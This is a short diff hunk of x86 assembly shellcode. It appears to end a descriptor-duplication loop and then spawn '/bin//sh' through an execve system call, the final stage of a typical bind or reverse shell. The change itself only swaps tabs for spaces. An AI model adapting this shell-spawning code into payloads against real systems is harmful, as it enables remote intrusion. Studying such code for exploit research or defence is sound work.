@@ -99,7 +99,7 @@ dup_loop:
     inc    ecx
     mov    al, 0xb           ; eax=sys_execve
     push   ecx
-    push   '//sh'	           ; 
-    push   '/bin'	           ; 
+    push   '//sh'            ; 
+    push   '/bin'            ; 
     mov    ebx, esp          ; ebx="/bin//sh", 0
     int    0x80              ; exec sys_execve
